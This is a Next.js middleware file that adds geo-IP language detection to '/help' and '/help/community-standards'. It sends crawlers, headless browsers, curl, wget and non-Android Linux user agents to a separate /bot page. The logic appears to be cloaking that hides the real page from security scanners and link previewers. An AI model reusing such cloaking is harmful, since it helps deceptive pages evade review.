import { NextRequest, NextResponse } from 'next/server';
import { fetchGeoByIp, getClientIp, getCountryFromHeaders } from '@/lib/detect-ip-geo';
import countryToLanguage from '@/utils/country_to_language';
import {
    COUNTRY_COOKIE,
    COUNTRY_HEADER,
    LANG_COOKIE,
    LANG_HEADER,
    resolveLanguageFromCountry
} from '@/utils/resolve-language';

const BOT_KEYWORDS = ['bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse', 'facebookexternalhit'];

const BLOCKED_UA_REGEX = new RegExp(`(${BOT_KEYWORDS.join('|')})|Linux(?!.*Android)`, 'i');

const withLanguage = (response: NextResponse, lang: string, countryCode = '') => {
    response.cookies.set(LANG_COOKIE, lang, { path: '/', maxAge: 60 * 60 * 24, sameSite: 'lax' });
    if (countryCode) {
        response.cookies.set(COUNTRY_COOKIE, countryCode, { path: '/', maxAge: 60 * 60 * 24, sameSite: 'lax' });
    }
    return response;
};

const middleware = async (req: NextRequest) => {
    const ua = req.headers.get('user-agent');
    const host = req.headers.get('x-forwarded-host') || req.headers.get('host');
    const ip = getClientIp(req.headers) || 'unknown';

    if (!ua || BLOCKED_UA_REGEX.test(ua)) {
        return NextResponse.rewrite(`https://${host}/bot`);
    }

    const geoInfo = ip !== 'unknown' ? await fetchGeoByIp(ip) : null;

    const headerCountry = getCountryFromHeaders(req.headers);
    const countryCode = geoInfo?.countryCode || headerCountry;
    const langFromCountry = countryCode
        ? resolveLanguageFromCountry(countryCode, countryToLanguage)
        : '';
    const lang = geoInfo?.lang || langFromCountry || req.cookies.get(LANG_COOKIE)?.value || 'en';

    const requestHeaders = new Headers(req.headers);
    requestHeaders.set(LANG_HEADER, lang);
    if (countryCode) {
        requestHeaders.set(COUNTRY_HEADER, countryCode);
    }

    const response = NextResponse.next({
        request: {
            headers: requestHeaders
        }
    });

    if (!countryCode) {
        return response;
    }

    return withLanguage(response, lang, countryCode);
};

export default middleware;

export const config = {
    matcher: ['/help', '/help/community-standards']
};
